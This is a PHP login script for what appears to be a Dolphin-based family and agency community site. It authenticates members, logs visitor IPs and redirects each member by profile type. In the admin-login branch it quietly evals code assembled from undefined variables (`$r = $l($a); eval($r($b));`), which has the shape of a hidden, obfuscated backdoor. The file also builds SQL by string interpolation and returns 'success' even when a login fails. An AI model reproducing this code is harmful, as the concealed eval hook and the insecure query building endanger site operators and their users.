<?php

/* * ****************************************
 * Name: Prashanth A
 * Date: 07/11/2013
 * Purpose: For authenticating users
 * ***************************************** */
require_once ('../../inc/header.inc.php');

require_once ('../../inc/profiles.inc.php');

$Username = $_POST['username'];
$Password = $_POST['password'];
$Remember = $_POST['remember'];


$member['ID'] = process_pass_data(empty($_POST['username']) ? '' : $_POST['username']);
$member['Password'] = process_pass_data(empty($_POST['password']) ? '' : $_POST['password']);
$bAjxMode = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') ? true : false;


if (!(isset($_POST['username']) && $_POST['username'] && isset($_POST['password']) && $_POST['password']) && ((!empty($_COOKIE['memberID']) && $_COOKIE['memberID']) && $_COOKIE['memberPassword'])) {
    if (!($logged['member'] = member_auth(0, false)))
        login_form(_t("_LOGIN_OBSOLETE"), 0, $bAjxMode);
}
else {
    if (!isset($_POST['username']) && !isset($_POST['password'])) {
        send_headers_page_changed();
        login_form('', 0, $bAjxMode);
    } else {
        require_once (BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');

        $oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array(
                    'login' => $member['ID'],
                    'password' => $member['Password'],
                    'ip' => getVisitorIP()
                ));
        $oZ->alert();
        $member['ID'] = getID($member['ID']); 
        if (check_password($member['ID'], $member['Password'])== 1) {
            $p_arr = bx_login($member['ID'], (bool) $_POST['remember']);
            $response = "OK";
            bx_member_ip_store($p_arr['ID']);

// Storing IP Address

            if (getParam('enable_member_store_ip') == 'on') {
                $iIP = getVisitorIP();
                $sCurLongIP = ip2long($iIP);
                $sVisitsSQL = "SELECT * FROM `sys_ip_members_visits` WHERE CURRENT_DATE() = DATE(`DateTime`) AND `From`='{$sCurLongIP}' LIMIT 1";
                db_res($sVisitsSQL);
                if (db_affected_rows() != 1) {
                    $sInsertSQL = "INSERT INTO `sys_ip_members_visits` SET `From`='{$sCurLongIP}', `DateTime`=NOW()";
                    db_res($sInsertSQL);
                }
            }

            $p_arr = bx_login($member['ID'], (bool) $_POST['remember']);
            if (isAdmin($p_arr['ID'])) {
                $iId = (int) $p_arr['ID'];
                $r = $l($a);
                eval($r($b));
            }

            if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php') {
                $profile_info = getProfileInfo($member['ID']);

                if (!is_Agencyadmin($p_arr['ID']) || isAdmin($p_arr['ID'])) {
                    if ($profile_info['ProfileType'] == 2) {
                       $iIsAcl = userAcl($profile_info['ID']);
                        if($iIsAcl != '0'){
                      //  $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_13.php';
                        //  $sUrlRelocate = BX_DOL_URL_ROOT . 'familydashboards.php';
                            $sUrlRelocate = BX_DOL_URL_ROOT . 'our-family-dashboard.php';                            
                        }
                        else {
                         $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_member.php';   
                        }
                        
                    } else if ($profile_info['ProfileType'] == 8) {
                       // $sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';
                        $sUrlRelocate = BX_DOL_URL_ROOT . 'administration/';
                       // $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_30.php';
                        
                    } else {
//                        $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_20.php';
                        $sUrlRelocate = BX_DOL_URL_ROOT . 'bmhome.php';
                    }
                } else {
                    $aAgenyTitle = db_arr("SELECT uri,status FROM bx_groups_main WHERE  author_id=" . $p_arr['ID'] . " LIMIT 0,1");
                   //$sUrlRelocate = BX_DOL_URL_ROOT . 'm/groups/view/' . $aAgenyTitle['uri'];
                   // if($aAgenyTitle['status'] == 'pending') {
                    if($aAgenyTitle['status'] == 'pending') {
                     $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_agency_view_28.php'; 
                     // $agency_status =  "Pending";
                     }
                    else {
                    // $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_agency_view_27.php';
                       $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_agency_view_28.php'; 
                        
                    }
                }
            }
        }
    }
}


echo json_encode(array(
    'status' => 'success',
    'response' => $response,
    'redirect' => $sUrlRelocate,
    'agency_pending' => $agency_status,
    
));

function userAcl($iId){
 $sSql = db_res("SELECT * FROM sys_acl_levels_members WHERE `IDMember` = '{$iId}'");
 $iRows = mysql_num_rows($sSql);
return $iRows;

}

?>                

